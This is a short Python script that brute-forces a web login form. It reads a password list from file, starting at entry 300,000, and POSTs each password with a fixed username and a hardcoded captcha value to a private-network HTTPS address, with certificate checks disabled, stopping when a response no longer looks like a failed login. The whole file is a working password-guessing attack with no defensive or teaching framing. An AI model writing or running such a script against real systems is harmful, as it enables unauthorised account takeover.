import requests
import os
with open('password.txt','r') as f:
      data = f.readlines()
for i in range(300000, len(data)):
    try:
          print ("i=",i)
          PARAMS = {'username' : 'mithlesh','password' : data[i][:-1],'captcha' : '834730691525230833276365'}
          session = requests.session()
          r = requests.post("https://172.27.30.144/",data = PARAMS,verify=False)
          print (r)
          res = r.text
          if ((res.find("Log In") > -1) and r.status_code==401):
              print ("not found,",i,data[i][:-1])
          elif r.status_code==503:
            print("Serverrrrr Errorrrr!")
            i = i-1
            continue
          else:
              print ("yesyes,",i,data[i][:-1])
              break
    except:
                i=i-1
